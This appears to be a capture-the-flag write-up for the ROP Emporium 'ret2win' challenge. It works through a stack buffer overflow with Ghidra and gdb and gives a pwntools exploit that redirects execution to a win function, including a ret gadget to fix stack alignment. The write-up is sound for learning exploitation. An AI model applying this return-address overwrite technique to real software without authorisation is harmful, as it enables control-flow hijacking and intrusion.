# [ret2win](https://ropemporium.com/challenge/ret2win.html)

Let's test the program :

```console
$ ./ret2win               
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> AAAA
Thank you!

Exiting
```

# Static analysis

Using ghidra we can find those functions :

```C
undefined8 main(void)
{
  setvbuf(stdout,(char *)0x0,2,0);
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}

void pwnme(void)
{
  undefined local_28 [32];
  
  memset(local_28,0,32);
  puts(
      "For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!"
      );
  puts("What could possibly go wrong?");
  puts(
      "You there, may I have your input please? And don\'t worry about null bytes, we\'re using read ()!\n"
      );
  printf("> ");
  read(0,local_28,56);
  puts("Thank you!");
  return;
}

void ret2win(void)
{
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

The read() function in pwnme() expects 56 bytes even tho the local_28 variable is 32 bytes long. This is vulnerable to a buffer overflow.  
  
Let's exploit this to redirect the program towards ret2win().

# Dynamic Analysis

Using gdb, we'll find out how many bytes we need to send to modify the return address.  

Let's take a look at the stack right after we've send 32 bytes :

```gdb
gef➤  r <<< $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x41"*32)')
```
``` gdb
────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffda20│+0x0000: 0x4141414141414141	 ← $rsp, $rsi
0x00007fffffffda28│+0x0008: 0x4141414141414141
0x00007fffffffda30│+0x0010: 0x4141414141414141
0x00007fffffffda38│+0x0018: 0x4141414141414141
0x00007fffffffda40│+0x0020: 0x00007fffffffda0a  →  0x000400007ffff7ff	 ← $rbp
0x00007fffffffda48│+0x0028: 0x00000000004006d7  →  <main+0040> mov edi, 0x400828
0x00007fffffffda50│+0x0030: 0x0000000000000001
0x00007fffffffda58│+0x0038: 0x00007ffff7df16ca  →  <__libc_start_call_main+007a> mov edi, eax
──────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40073c <pwnme+0054>     mov    rsi, rax
     0x40073f <pwnme+0057>     mov    edi, 0x0
     0x400744 <pwnme+005c>     call   0x400590 <read@plt>
 →   0x400749 <pwnme+0061>     mov    edi, 0x40091b
     0x40074e <pwnme+0066>     call   0x400550 <puts@plt>
     0x400753 <pwnme+006b>     nop    
     0x400754 <pwnme+006c>     leave  
     0x400755 <pwnme+006d>     ret    
     0x400756 <ret2win+0000>   push   rbp
```

We can see that the rbp is stored right after the variable : our payload will have an offset of 32 bytes, 8 bytes to overwrite the rbp, and finally the address of ret2win.

# Exploit

Let's send our payload using pwntools :

```python
from pwn import *

binary = ELF("./ret2win")

offset = 32
win = binary.sym["ret2win"]
ret = 0x400755

payload = b"".join([
    b"A"*offset,
    b"SAVEDRBP",
    p64(win),
])

p = process("./ret2win")
input("Waiting for debugger...")
p.recvrepeat(.1)
p.send(payload)
p.interactive()
```

```console
$ python3 exploit.py
[*] '/home/coucou/Documents/ROP_Emporium/01_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 12477
Waiting for debugger...
[*] Switching to interactive mode
Thank you!
Well done! Here's your flag:
```

We're reaching the ret2win() function, but the program isn't giving us the flag. Let's look at what's going on with gdb :

```gdb
───────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7f76f9e825f4 <do_system+0144> mov    QWORD PTR [rsp+0x60], r12
   0x7f76f9e825f9 <do_system+0149> mov    r9, QWORD PTR [rax]
   0x7f76f9e825fc <do_system+014c> lea    rsi, [rip+0x149a4c]        # 0x7f76f9fcc04f
 → 0x7f76f9e82603 <do_system+0153> movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7f76f9e82608 <do_system+0158> mov    QWORD PTR [rsp+0x68], 0x0
   0x7f76f9e82611 <do_system+0161> call   0x7f76f9f2c230 <__GI___posix_spawn>
   0x7f76f9e82616 <do_system+0166> mov    rdi, rbx
   0x7f76f9e82619 <do_system+0169> mov    r12d, eax
   0x7f76f9e8261c <do_system+016c> call   0x7f76f9f2c130 <__posix_spawnattr_destroy>
───────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped 0x7f76f9e82603 in do_system (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x7f76f9e82603 → do_system(line=0x400943 "/bin/cat flag.txt")
[#1] 0x40076e → ret2win()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

The program is running into a sigsegv while trying to execute movaps. This is probably because of a misalignment of the stack. We need to add a ret command before executing ret2win(). Using [this final script](./exploit.py), we get :

```console
$ python3 exploit.py
[*] '/home/coucou/Documents/ROP_Emporium/01_ret2win/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process './ret2win': pid 13293
[*] Switching to interactive mode
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
[*] Process './ret2win' stopped with exit code 0 (pid 13293)
```

The program returned the flag, our exploit is working !
